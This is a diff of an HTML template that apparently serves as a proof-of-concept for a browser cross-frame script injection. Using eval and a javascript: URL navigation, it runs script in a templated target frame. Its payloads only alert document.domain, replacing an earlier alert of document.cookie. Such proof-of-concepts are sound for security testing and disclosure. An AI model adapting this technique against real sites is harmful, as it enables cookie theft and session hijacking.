@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <iframe src="http://{{ .Addr }}/redirect"></iframe>
-<iframe src="{{ .NonTargetURL }}"></iframe>
+<iframe src="{{ .TargetURL }}"></iframe>
 <script>
-	window.top[0].eval('_=top[1];with(new XMLHttpRequest)open("get","/sleep",false),send();_.location="javascript:alert(document.cookie)"');
+	var use_sleep = '{{ .UseSleep }}'
+
+	if (use_sleep == 'yes') {
+		top[0].eval('_=top[1];with(new XMLHttpRequest)open("get","/sleep",false),send();_.location="javascript:alert(document.domain)"');
+	} else {
+	 top[0].eval('_=top[1];alert();_.location="javascript:alert(document.domain)"');
+	}
 </script>
